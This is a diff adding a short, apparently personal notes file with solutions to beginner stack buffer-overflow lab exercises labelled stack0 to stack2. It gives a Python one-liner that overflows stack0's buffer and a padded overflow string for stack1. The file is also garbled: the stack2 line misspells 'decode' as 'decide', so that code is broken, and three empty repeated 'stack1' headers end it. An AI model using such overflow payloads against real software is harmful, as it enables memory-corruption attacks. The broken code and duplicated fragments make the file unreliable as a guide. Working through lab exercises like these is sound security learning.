@@ -1,0 +1,13 @@
+=====[ stack0 ]=====
+python -c "print('q' * 65)" | ./stack0
+
+=====[ stack1 ]=====
+'61626364'.decode('hex')
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba
+
+=====[ stack2 ]=====
+'0d0a0d0a'.decide('hex')
+
+=====[ stack1 ]=====
+=====[ stack1 ]=====
+=====[ stack1 ]=====
